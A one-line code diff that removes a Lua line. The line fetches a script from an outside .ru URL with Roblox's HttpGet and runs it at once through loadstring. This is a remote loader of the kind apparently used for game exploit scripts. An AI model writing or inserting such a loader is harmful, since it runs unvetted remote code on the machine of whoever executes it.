@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://reativ.ru/Scripts/Free/NT.lua", true))() 
